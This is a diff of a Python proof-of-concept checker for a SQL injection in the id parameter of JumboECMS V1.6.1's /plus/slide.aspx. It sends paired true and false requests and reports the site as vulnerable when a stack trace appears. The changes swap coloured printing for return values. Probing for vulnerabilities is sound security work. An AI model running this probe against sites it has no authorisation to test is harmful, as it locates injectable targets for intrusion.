@@ -8,8 +8,8 @@ description: 文件/plus/slide.aspx参数id存在SQL注入。
 '''
 import sys
 import requests
-import warnings
-from termcolor import cprint
+
+
 
 class jumboecms_slide_id_sqli_BaseVerify:
     def __init__(self, url):
@@ -25,12 +25,12 @@ class jumboecms_slide_id_sqli_BaseVerify:
             req1 = requests.get(trueurl, headers=headers, timeout=10, verify=False)
             req2 = requests.get(falseurl, headers=headers, timeout=10, verify=False)
             if r"Stack trace" not in req1.text and r"Stack trace" in req2.text:
-                cprint("[+]存在JumboECMS V1.6.1 注入漏洞...(高危)\tpayload: "+falseurl, "red")
+                return "[+]存在JumboECMS V1.6.1 注入漏洞...(高危)\tpayload: "+falseurl
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-]connect timeout"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
+
     testVuln = jumboecms_slide_id_sqli_BaseVerify(sys.argv[1])
     testVuln.run()
